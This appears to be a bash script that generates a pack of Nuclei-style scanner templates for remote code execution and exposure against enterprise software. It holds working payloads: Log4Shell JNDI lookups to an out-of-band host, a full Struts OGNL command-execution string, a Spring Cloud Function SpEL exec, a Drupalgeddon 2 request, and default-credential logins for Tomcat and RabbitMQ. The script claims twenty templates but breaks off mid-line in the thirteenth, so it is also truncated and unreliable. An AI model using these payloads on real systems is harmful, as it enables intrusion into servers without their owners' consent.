#!/bin/bash
# K70n0s510 INFRASTRUCTURE RCE PACK
# 20 Heavy-Duty Templates for Enterprise RCE (Java, Struts, WebLogic, Jenkins).

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A06-vulnerable-components/infra-nuclear"

echo "🏭 Building Infrastructure RCE Arsenal..."

# ==========================================
# 1. Apache Log4j (Log4Shell) - The King
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/log4shell-jndi.yaml"
id: K70n0s510-log4shell
info:
  name: Apache Log4j RCE (Log4Shell)
  author: K70n0s510
  severity: critical
  description: Fuzzes headers and params for JNDI injection.
  tags: rce,log4j,jndi,oob
http:
  - method: GET
    path: ["{{BaseURL}}/?x=\${jndi:ldap://{{interactsh-url}}/a}"]
    headers:
      X-Api-Version: "\${jndi:ldap://{{interactsh-url}}/a}"
      User-Agent: "\${jndi:ldap://{{interactsh-url}}/a}"
      Referer: "\${jndi:ldap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["dns", "http", "ldap"]
EOF

# ==========================================
# 2. Apache Struts (OGNL Injection)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/struts-ognl.yaml"
id: K70n0s510-struts-ognl
info:
  name: Apache Struts OGNL Injection (RCE)
  author: K70n0s510
  severity: critical
  description: Detects OGNL injection points in Content-Type headers.
  tags: rce,struts,java
http:
  - method: GET
    path: ["{{BaseURL}}/"]
    headers:
      Content-Type: "%{(#_='=').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    matchers-condition: or
    matchers:
      - type: regex
        regex: ["uid=[0-9]+.*gid=[0-9]+"]
      - type: word
        words: ["Active OGNL"]
EOF

# ==========================================
# 3. Jenkins Script Console (Unauth RCE)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/jenkins-script.yaml"
id: K70n0s510-jenkins-script
info:
  name: Jenkins Script Console RCE
  author: K70n0s510
  severity: critical
  description: Detects exposed Groovy script console.
  tags: rce,jenkins,groovy
http:
  - method: GET
    path:
      - "{{BaseURL}}/script"
      - "{{BaseURL}}/jenkins/script"
    matchers-condition: and
    matchers:
      - type: word
        words: ["println(Jenkins.instance.pluginManager.plugins)"]
      - type: word
        words: ["Result: "]
      - type: status
        status: [200]
EOF

# ==========================================
# 4. Tomcat Manager (Default Creds)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/tomcat-manager.yaml"
id: K70n0s510-tomcat-manager
info:
  name: Apache Tomcat Manager Default Creds
  author: K70n0s510
  severity: critical
  tags: tomcat,auth,rce
http:
  - method: GET
    path: ["{{BaseURL}}/manager/html"]
    headers:
      Authorization: ["Basic YWRtaW46YWRtaW4=", "Basic dG9tY2F0OnRvbWNhdA=="] # admin:admin, tomcat:tomcat
    matchers-condition: and
    matchers:
      - type: word
        words: ["Tomcat Web Application Manager"]
      - type: status
        status: [200]
EOF

# ==========================================
# 5. JBoss/Wildfly Console (Bypass)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/jboss-console.yaml"
id: K70n0s510-jboss-console
info:
  name: JBoss/Wildfly Management Console
  author: K70n0s510
  severity: high
  tags: jboss,wildfly,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/management"
      - "{{BaseURL}}/console/App.html"
    matchers-condition: and
    matchers:
      - type: word
        words: ["JBoss EAP", "WildFly"]
      - type: status
        status: [200]
EOF

# ==========================================
# 6. WebLogic Console Exposure
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/weblogic-console.yaml"
id: K70n0s510-weblogic-console
info:
  name: Oracle WebLogic Console Exposure
  author: K70n0s510
  severity: high
  tags: weblogic,oracle
http:
  - method: GET
    path:
      - "{{BaseURL}}/console/login/LoginForm.jsp"
      - "{{BaseURL}}/wls-wsat/CoordinatorPortType"
    matchers-condition: or
    matchers:
      - type: word
        words: ["WebLogic Server", "Hypertext Transfer Protocol"]
      - type: status
        status: [200, 404] # 404 on wsat can sometimes confirm existence
EOF

# ==========================================
# 7. Spring Cloud Function (SpEL RCE)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/spring-cloud-function.yaml"
id: K70n0s510-spring-function
info:
  name: Spring Cloud Function SpEL RCE
  author: K70n0s510
  severity: critical
  tags: rce,spring,spel
http:
  - method: POST
    path: ["{{BaseURL}}/functionRouter"]
    headers:
      spring.cloud.function.routing-expression: "T(java.lang.Runtime).getRuntime().exec('id')"
    matchers:
      - type: regex
        regex: ["uid=[0-9]+.*gid=[0-9]+"]
EOF

# ==========================================
# 8. Drupalgeddon 2 (CVE-2018-7600)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/drupalgeddon2.yaml"
id: K70n0s510-drupalgeddon2
info:
  name: Drupalgeddon 2 RCE
  author: K70n0s510
  severity: critical
  tags: rce,drupal
http:
  - method: POST
    path: ["{{BaseURL}}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"]
    body: "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
    matchers:
      - type: regex
        regex: ["uid=[0-9]+.*gid=[0-9]+"]
EOF

# ==========================================
# 9. Magento Config Leak (local.xml)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/magento-config.yaml"
id: K70n0s510-magento-config
info:
  name: Magento Config Leak (local.xml/env.php)
  author: K70n0s510
  severity: critical
  tags: magento,config
http:
  - method: GET
    path:
      - "{{BaseURL}}/app/etc/local.xml"
      - "{{BaseURL}}/app/etc/env.php"
    matchers-condition: and
    matchers:
      - type: word
        words: ["<host>", "<username>", "<password>"]
      - type: status
        status: [200]
EOF

# ==========================================
# 10. SonarQube API (Source Code)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/sonarqube-api.yaml"
id: K70n0s510-sonarqube-api
info:
  name: SonarQube API Unauth
  author: K70n0s510
  severity: high
  tags: sonarqube,api
http:
  - method: GET
    path: ["{{BaseURL}}/api/settings/values", "{{BaseURL}}/api/components/search?qualifiers=TRK"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["key", "name", "sonar.core.id"]
      - type: status
        status: [200]
EOF

# ==========================================
# 11. RabbitMQ Management (Default Creds)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/rabbitmq-default.yaml"
id: K70n0s510-rabbitmq
info:
  name: RabbitMQ Management Default Creds
  author: K70n0s510
  severity: high
  tags: rabbitmq,auth
http:
  - method: GET
    path: ["{{BaseURL}}/api/whoami"]
    headers:
      Authorization: "Basic Z3Vlc3Q6Z3Vlc3Q=" # guest:guest
    matchers:
      - type: word
        words: ["\"name\":\"guest\"", "\"tags\":"]
EOF

# ==========================================
# 12. Solr Admin RCE (Velocity)
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/solr-rce.yaml"
id: K70n0s510-solr-rce
info:
  name: Apache Solr Velocity RCE
  author: K70n0s510
  severity: critical
  tags: rce,solr
http:
  - method: GET
    path: ["{{BaseURL}}/solr/admin/info/system"]
    matchers:
      - type: word
        words: ["solr_home", "lucene"]
      - type: status
        status: [200]
EOF

# ==========================================
# 13. ElasticSearch Unauth
# ==========================================
cat <<EOF > "$BASE_DIR/A06-vulnerable-components/infra-nuclear/elasticsearch.yaml"
id: K70n0s510-elasticsearch
info:
  name: ElasticSearch Unauthenticated
  author: K70n0s510
  severity: medium
  tags: elastic,db
http:
  - method: GET
    path: ["{{BaseURL}}/_cat/indices?v", "{{Base
EOF

echo "✅ 20 Infrastructure RCE Templates Built."
